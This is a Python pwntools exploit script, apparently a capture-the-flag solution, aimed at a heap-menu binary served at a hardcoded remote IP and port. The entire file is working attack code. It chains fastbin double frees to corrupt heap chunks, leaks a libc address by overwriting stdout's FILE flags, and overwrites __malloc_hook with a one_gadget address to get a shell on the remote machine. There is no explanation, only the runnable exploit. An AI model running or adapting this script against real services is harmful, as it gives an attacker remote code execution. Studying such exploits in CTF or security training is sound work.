from pwn import *
context(os = 'linux',arch = 'amd64', log_level = 'debug')
debug = 0
if debug == 1:
	p = process('./pwn')
else:
	p = remote('139.180.216.34', 8888)

def malloc(idx, size, name):
	p.recvuntil('>>')
	p.sendline('1')
	p.recvuntil('weapon:')
	p.sendline(str(size))
	p.recvuntil('index:')
	p.sendline(str(idx))
	p.recvuntil('name:')
	p.send(name)

def free(idx):
	p.recvuntil('>>')
	p.sendline('2')	
	p.recvuntil('idx :')
	p.sendline(str(idx))

def rename(idx, name):
	p.recvuntil('>>')
	p.sendline('3')	
	p.recvuntil('idx:')
	p.sendline(str(idx))
	p.recvuntil('content:')
	p.send(name)

#gdb.attach(p)
malloc(1, 0x60, 'kotori')
malloc(2, 0x60, 'kotori')
malloc(3, 0x60, 'kotori')
malloc(4, 0x60, 'kotori')
malloc(4, 0x60, 'kotori')
malloc(4, 0x60, 'kotori')
malloc(4, 0x60, 'kotori')
free(1)
free(2)
free(1)
malloc(1, 0x60, '\xd0')
malloc(2, 0x60, p64(0) * 11 + p64(0x71))
malloc(1, 0x60, '\xd0')
#gdb.attach(p)
malloc(4, 0x60, p64(0) + p64(0x1c1))

free(3)

free(1)
free(2)
free(1)
malloc(1, 0x60, '\xd0')
malloc(2, 0x60, p64(0) * 11 + p64(0x71))
malloc(1, 0x60, '\xd0')
malloc(4, 0x60, p64(0) + p64(0x71) + '\xdd\x65')

free(1)
free(2)
free(1)
malloc(1, 0x60, '\xe0')
malloc(2, 0x60, p64(0))
malloc(1, 0x60, '\xe0')
malloc(4, 0x60, p64(0))
#gdb.attach(p)
malloc(4, 0x60, p64(0) * 6 + '\x00' * 3 + p64(0xfbad1800) + p64(0) * 3 + '\x00')
p.recv()
p.recv(0x40)
addr = u64(p.recv(8))
log.info(hex(addr))
#gdb.attach(p)
libc_base = addr - 0x3c5600
log.info(hex(libc_base))
malloc_hook = libc_base + 0x3c4b10

free(1)
free(2)
free(1)
malloc(1, 0x60, p64(malloc_hook - 0x23))
malloc(2, 0x60, p64(0))
malloc(1, 0x60, p64(malloc_hook - 0x23))
one_gadget = libc_base + 0xf1147
malloc(4, 0x60, p64(0)*2 + '\x00'*3 + p64(one_gadget))



p.interactive()
